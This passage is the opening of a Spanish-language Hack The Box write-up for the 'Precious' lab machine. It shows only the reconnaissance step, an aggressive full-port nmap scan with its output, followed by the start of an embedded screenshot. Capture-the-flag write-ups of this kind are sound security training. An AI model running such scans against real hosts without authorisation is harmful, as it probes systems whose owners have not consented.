---
title: Precious
date: 2026-1-6 02:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, precious ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/3adcfd6093f8ddb4dffe8422da6377c8.png
    alt: Hack The Box
---

> Precious
Linux · Easy - Adventure mode

## 🔭 Reconocimiento:

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -Pn -sSVC --min-rate  5000 10.129.228.98
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 22:21 CET
Nmap scan report for 10.129.228.98
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.15 seconds
```

![precious](data:image/png;base64,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